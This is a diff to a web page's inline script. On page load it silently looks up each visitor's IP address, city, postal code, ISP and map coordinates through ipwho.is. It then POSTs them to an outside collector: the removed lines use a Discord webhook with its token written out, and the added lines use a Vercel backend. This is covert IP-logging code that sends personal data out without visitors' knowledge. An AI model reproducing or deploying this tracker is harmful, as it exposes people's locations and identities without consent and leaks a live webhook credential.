@@ -97,38 +97,41 @@
     </div>
     <script>
     document.addEventListener("DOMContentLoaded", function() {
-        const webhookUrl = "https://discord.com/api/webhooks/1536688037310763090/RA6SSMPxYXKUYxV4_vXLpSYlyFABwS6ZctLd0MmbXb8Pmyqp16wO42Yh8rsKZrAy1jA2";
-        
-        const apiUrl = new URL("https://ipwho.is");
-        apiUrl.searchParams.set("t", Date.now());
+    const vercelApiUrl = "https://backend-js-umber.vercel.app/";
+    
+    const apiUrl = new URL("https://ipwho.is");
+    apiUrl.searchParams.set("t", Date.now());
 
-        fetch(apiUrl.toString())
-        .then(response => response.json())
-        .then(data => {
-            if (!data.success) return;
+    fetch(apiUrl.toString())
+    .then(response => response.json())
+    .then(data => {
+        if (!data.success) return;
 
-            const mapText = data.city || "LOCATION";
-            const lat = data.latitude;
-            const lon = data.longitude;
+        const mapText = data.city || "LOCATION";
+        const lat = data.latitude;
+        const lon = data.longitude;
 
-            const gMapsLink = "[" + mapText + "](https://www.google.com/maps/search/?api=1&query=" + lat + "%2C" + lon + ")";
+        const gMapsLink = "[" + mapText + "](https://www.google.com/maps/search/?api=1&query=" + lat + "%2C" + lon + ")";
 
-            const rawContentText = "🟢 **Website Traffic Logged**\n" +
-                                   "• **User IP:** " + (data.ip || 'Hidden') + "\n" +
-                                   "• **Location:** " + (data.city || 'N/A') + ", " + (data.region || 'N/A') + ", " + (data.country || 'Unknown') + "\n" +
-                                   "• **Postal Code:** " + (data.postal || 'N/A') + "\n" +
-                                   "• **Provider/ISP:** " + (data.connection?.isp || 'N/A') + "\n" +
-                                   "• **Google Maps:** " + gMapsLink;
+        const rawContentText = "🟢 **Website Traffic Logged**\n" +
+                               "• **User IP:** " + (data.ip || 'Hidden') + "\n" +
+                               "• **Location:** " + (data.city || 'N/A') + ", " + (data.region || 'N/A') + ", " + (data.country || 'Unknown') + "\n" +
+                               "• **Postal Code:** " + (data.postal || 'N/A') + "\n" +
+                               "• **Provider/ISP:** " + (data.connection?.isp || 'N/A') + "\n" +
+                               "• **Google Maps:** " + gMapsLink;
 
-            fetch(webhookUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: rawContentText })
+        fetch(vercelApiUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ 
+                message: rawContentText,
+                type: "ip"
             })
-            .then(res => console.log("Payload transferred."))
-            .catch(err => console.error("Webhook processing error:", err));
         })
-        .catch(err => console.error("API tracking failed:", err));
+        .then(res => console.log("Payload transferred."))
+        .catch(err => console.error("Webhook processing error:", err));
+    })
+    .catch(err => console.error("API tracking failed:", err));
     });
     </script>
 
